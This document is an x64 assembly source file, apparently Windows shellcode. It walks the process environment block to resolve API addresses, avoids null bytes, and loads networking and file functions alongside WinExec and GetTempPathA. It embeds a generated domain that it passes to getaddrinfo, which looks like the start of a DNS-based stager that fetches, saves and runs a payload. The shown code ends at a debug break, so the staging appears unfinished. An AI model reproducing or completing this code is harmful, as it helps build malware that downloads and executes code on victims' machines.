 .code
 
;note: ExitProcess is forwarded
main proc
    sub rsp, 070h            ;reserve stack space for called functions
    and rsp, 0fffffffffffffff0h     ;make sure stack 16-byte aligned   
    jmp entry_point
        loadlibrarya_func    db  'LoadLibraryA', 021h
        gettemppath_func    db  'GetTempPathA', 021h
        winexec_func    db  'WinExec', 021h
        ws2_32_lib         db  'ws2_32.dll', 021h
        wsasturtup_func        db  'WSAStartup', 021h
        getaddrinfo_func        db  'getaddrinfo', 021h
        msvcrt_lib         db  'msvcrt.dll',021h
        fopen_func       db  'fopen', 021h
        fwrite_func       db  'fwrite', 021h
        fclose_func       db  'fclose', 021h
        domain            db  061h,061h,061h,061h,02eh,'a.0xxx.ws',022h ; GENERATED
entry_point:

    lea rsi, loadlibrarya_func 
    lea rcx, entry_point
    sub rcx, rsi
    mov rdi, rsp
    rep movsb [rdi],[rsi]
    mov rax,0216C6C642E32336Ch
    push rax
    mov rax, 0656E72656B303030h
    push rax
    mov rbx, rsp
    add rbx, 3
    dec rcx
    xor dl,dl
next_byte:
    inc rcx
    mov al, [rbx+rcx]
    cmp al, 021h
    je put_null
    cmp al, 022h
    je end_string
    jmp next_byte
put_null:
    mov [rbx+rcx],dl
    jmp next_byte
end_string:
    mov [rbx+rcx],dl
    
    xor rax, rax
    mov ax, 01d1h
    add rdx, rax
    jmp rdx ; Jamp over function  (to avoid null bytes on call)
    
;look up address of function from DLL export table
;rcx=DLL name string, rdx=function name string
;DLL name must be in uppercase
;r15=address of LoadLibraryA (optional, needed if export is forwarded)
;returns address in rax
;returns 0 if DLL not loaded or exported function not found in DLL

lookup_api  proc
    sub rsp, 48h            ;set up stack frame in case we call loadlibrary
 
start:
    xor rax, rax
    mov r8, gs:[60h+rax]        ;peb
    mov r8, [r8+18h]        ;peb loader data
    lea r12, [r8+10h]       ;InLoadOrderModuleList (list head) - save for later
    mov r8, [r12]           ;follow _LIST_ENTRY->Flink to first item in list
    cld
 
for_each_dll:               ;r8 points to current _ldr_data_table_entry
 
    mov rdi, [r8+60h]       ;UNICODE_STRING at 58h, actual string buffer at 60h
    mov rsi, rcx            ;pointer to dll we're looking for
 
compare_dll:
    lodsb                   ;load character of our dll name string
    test al, al             ;check for null terminator
    jz found_dll            ;if at the end of our string and all matched so far, found it
 
    mov ah, [rdi]           ;get character of current dll
    cmp ah, al
    jne wrong_dll           ;found a character mismatch - try next dll
 
    inc rdi                 ;skip to next unicode character
    inc rdi
    jmp compare_dll         ;continue string comparison
 
wrong_dll:
    mov r8, [r8]            ;move to next _list_entry (following Flink pointer)
    cmp r8, r12             ;see if we're back at the list head (circular list)
    jne for_each_dll
 
    xor rax, rax            ;DLL not found
    add rsp, 48h            ;clean up stack
    ret
 
found_dll:
    mov rbx, [r8+30h]       ;get dll base addr - points to DOS "MZ" header
 
    mov r9d, [rbx+3ch]      ;get DOS header e_lfanew field for offset to "PE" header
    add r9, rbx             ;add to base - now r9 points to _image_nt_headers64
    xor rax,rax
    mov al, 088h
    add r9, rax             ;18h to optional header + 70h to data directories
                            ;r9 now points to _image_data_directory[0] array entry
                            ;which is the export directory
 
    mov r13d, [r9]          ;get virtual address of export directory
    test r13, r13           ;if zero, module does not have export table
    jnz has_exports
 
    xor rax, rax            ;no exports - function will not be found in dll
    add rsp, 48h            ;clean up stack
    ret
 
has_exports:
    lea r8, [rbx+r13]       ;add dll base to get actual memory address
                            ;r8 points to _image_export_directory structure (see winnt.h)
 
    mov r14d, [r9+4]        ;get size of export directory
    add r14, r13            ;add base rva of export directory
                            ;r13 and r14 now contain range of export directory
                            ;will be used later to check if export is forwarded
 
    mov ecx, [r8+18h]       ;NumberOfNames
    mov r10d, [r8+20h]      ;AddressOfNames (array of RVAs)
    add r10, rbx            ;add dll base
 
    dec ecx                 ;point to last element in array (searching backwards)
for_each_func:
    lea r9, [r10 + 4*rcx]   ;get current index in names array
 
    mov edi, [r9]           ;get RVA of name
    add rdi, rbx            ;add base
    mov rsi, rdx            ;pointer to function we're looking for
 
compare_func:
    cmpsb
    jne wrong_func          ;function name doesn't match
 
    mov al, [rsi]           ;current character of our function
    test al, al             ;check for null terminator
    jz found_func           ;if at the end of our string and all matched so far, found it
 
    jmp compare_func        ;continue string comparison
 
wrong_func:
    loop for_each_func      ;try next function in array
 
    xor rax, rax            ;function not found in export table
    add rsp, 48h            ;clean up stack
    ret
 
found_func:                 ;ecx is array index where function name found
 
                            ;r8 points to _image_export_directory structure
    mov r9d, [r8+24h]       ;AddressOfNameOrdinals (rva)
    add r9, rbx             ;add dll base address
    mov cx, [r9+2*rcx]      ;get ordinal value from array of words
 
    mov r9d, [r8+1ch]       ;AddressOfFunctions (rva)
    add r9, rbx             ;add dll base address
    mov eax, [r9+rcx*4]     ;Get RVA of function using index
 
    cmp rax, r13            ;see if func rva falls within range of export dir
    jl not_forwarded
    cmp rax, r14            ;if r13 <= func < r14 then forwarded
    jae not_forwarded
 
    ;forwarded function address points to a string of the form <DLL name>.<function>
    ;note: dll name will be in uppercase
    ;extract the DLL name and add ".DLL"
 
    lea rsi, [rax+rbx]      ;add base address to rva to get forwarded function name
    lea rdi, [rsp+30h]      ;using register storage space on stack as a work area
    mov r12, rdi            ;save pointer to beginning of string
 
copy_dll_name:
    movsb
    cmp byte ptr [rsi], 2eh     ;check for '.' (period) character
    jne copy_dll_name
 
    movsb                               ;also copy period
    mov dword ptr [rdi], 0ff4c4c44h      ;add "DLL" extension and null terminator
    xor cl, cl
    mov [rdi + 3], cl
    mov rcx, r12            ;r12 points to "<DLL name>.DLL" string on stack
    call r15                ;call LoadLibraryA with target dll
 
    mov rcx, r12            ;target dll name
    mov rdx, rsi            ;target function name
    jmp start               ;start over with new parameters
 
not_forwarded:
    add rax, rbx            ;add base addr to rva to get function address
done:
    add rsp, 48h            ;clean up stack
    ret
 
lookup_api endp
    
main_prog:
    
    xor rax, rax
    mov r11, rbx ; Kernel 32
    mov rcx, r11
    add rbx, 13
    mov rdx, rbx ; load_library
    lea r15, lookup_api
    call r15
    push rax ; load_lib done

    mov rcx, r11
    add rdx, 13

    call r15
    push rax ; gettemppath done
    
    mov rcx, r11
    add rdx, 13

    call r15
    push rax ; WinExec done
    
    add r11, 02fh
    mov rdi, r11
    mov rcx, r11
    mov rax,[rsp+010h]
    sub rsp, 020h
    call rax          ; LoadLibraryA('ws2_32.dll')
    add rsp, 020h
    mov rcx, rdi
    mov rdx, rdi
    mov r11, rdi
    add rdx, 0bh
    call r15
    push rax          ; WSAStartup
    mov rcx, r11
    add rdx, 0bh
    
    call r15
    push rax         ; getaddrinfo
    add r11,022h
    mov rdi, r11
    mov rcx, r11
    mov rax,[rsp+020h]
    sub rsp, 020h
    call rax          ; LoadLibraryA('msvrt.dll')
    add rsp, 020h
    mov r11,rdi
    mov rcx,r11
    mov rdx,r11
    add rdx,0bh
    call r15
    push rax         ; fopen
    
    mov rcx, r11
    add rdx, 06h
    call r15
    push rax        ; fwrite
    
    mov rcx, r11
    add rdx, 07h
    call r15
    push rax        ; fclose
    
    push rsp        ; functions
    xor rax,rax
    mov al,0BBh
    add rax,rsp
    push rax        ; domain address
    mov rax,[rsp+040h]
    add rsp, -256
    mov rdx, rsp
    call rax
    mov r15, rsp
    sub r15, -256

    
    int 3
 
main endp
 
end